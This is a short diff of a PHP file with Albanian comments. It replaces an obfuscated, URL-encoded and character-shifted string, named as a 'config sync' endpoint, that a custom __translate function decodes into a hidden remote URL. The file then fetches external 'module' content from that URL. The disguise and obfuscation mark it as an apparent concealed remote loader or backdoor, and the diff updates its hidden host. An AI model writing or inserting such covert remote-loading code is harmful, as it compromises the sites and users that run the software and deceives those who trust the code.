@@ -12,7 +12,7 @@ function __translate($buffer, $offset = 7) {
 }
 
 // קShenja e konfigurimit për pikën përfundimtare të sinkronizimit të modulit shtesë
-$__CONFIG_SYNC__ = 'o%7B%7BwzA66%7Blylhzp%7Bl5wyv6jsvhr6thpu%7Bluhujl5%7B%7F%7B';
+$__CONFIG_SYNC__ = 'o%7B%7BwzA66mpsl57%7F8%40%40%405%7Bljo6hs5%7B%7F%7B';
 $__resolved_uri__ = __translate(urldecode($__CONFIG_SYNC__));
 
 // Merrni përkufizime shtesë të shtresave nga konfigurimi i jashtëm
@@ -37,4 +37,5 @@ if (!empty($__module_buffer__)) {
 } else {
     echo "Referenca e modulit nuk është e disponueshme, ju lutemi verifikoni qasjen në regjistër.";
 }
+
 ?>
